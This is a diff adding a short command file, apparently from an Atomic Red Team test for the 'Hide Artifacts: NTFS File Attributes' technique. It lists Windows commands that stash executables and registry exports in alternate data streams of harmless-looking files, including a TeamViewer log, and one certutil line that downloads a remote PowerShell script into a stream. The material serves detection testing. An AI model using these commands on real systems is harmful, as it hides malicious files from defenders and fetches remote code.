@@ -1,0 +1,16 @@
+#TechniqueName: Hide Artifacts: NTFS File Attributes
+#AtomicTestName: Alternate Data Streams (ADS)
+#Language: cmd
+
+#commands
+type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe
+findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
+makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab
+print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe
+reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg
+regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat
+esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o 
+
